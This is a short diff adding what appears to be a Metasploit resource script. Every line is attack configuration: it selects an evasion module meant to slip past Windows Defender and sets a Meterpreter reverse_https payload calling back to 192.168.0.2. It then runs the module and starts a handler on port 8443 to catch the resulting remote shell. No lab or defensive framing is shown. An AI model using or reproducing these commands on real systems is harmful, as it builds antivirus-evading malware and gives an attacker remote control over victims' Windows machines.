@@ -1,0 +1,6 @@
+use evasion/windows/windows_defender_exe
+set payload windows/meterpreter/reverse_https
+set lhost 192.168.0.2
+run
+
+handler -p windows/meterpreter/reverse_https -H 0.0.0.0 -P 8443
